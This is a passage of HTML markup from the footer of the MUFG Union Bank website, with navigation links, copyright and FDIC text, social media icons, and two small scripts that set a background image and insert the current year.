			<li><a href="">Investor Relations</a></li>
		 
		 
	
		 
		
			<li><a href="">Diversity &amp; Inclusion</a></li>
		 
		 
	
</ul>
</dd>
</dl>            </div>
        
    
    <div class="clear"></div>
</div>

   
           <script type="text/javascript">
     ub.backgrounds = ['/ubimages/ub-about-bg-gradient.jpg'];
</script>
   

	
	<!-- /footer -->

	<!-- copyright footer -->
	
		

<div class="copyright-footer">
	
		<p class="copyright-text clearfix">
        <span class="year current-year"></span>
        <script type="text/javascript">try{dom.query('.current-year').html('&copy;' + (new Date()).getFullYear());} catch(e) {}</script>
        MUFG Union Bank, N.A. All rights reserved. Member FDIC. <span class="trade">Equal Housing Lender</span>
					<br />
					<span class="copyright">Union Bank is a registered trademark and brand name of MUFG Union Bank, N.A.</span>
    </p>	
	
		<span class="disclaimer-group-ref">tcm:9-58696</span>
<div class="copyright-footer-bottom clearfix">
<div class="social-media-link-container"><span class="social-media-link-label">Follow us</span>
<ul class="social-media-links">
<li><a class="facebook-link facebook-icon social-media-icon" href=""> </a></li>
<li><a class="twitter-link twitter-icon social-media-icon" href=""> </a></li>
<li><a class="linkedin-link linkedin-icon social-media-icon" href=""> </a></li>
<li><a class="youtube-link youtube-icon social-media-icon" href=""> </a></li>
</ul>
</div>
</div>	
</div>
	
	<!-- /copyright footer -->

	
</body>
</html>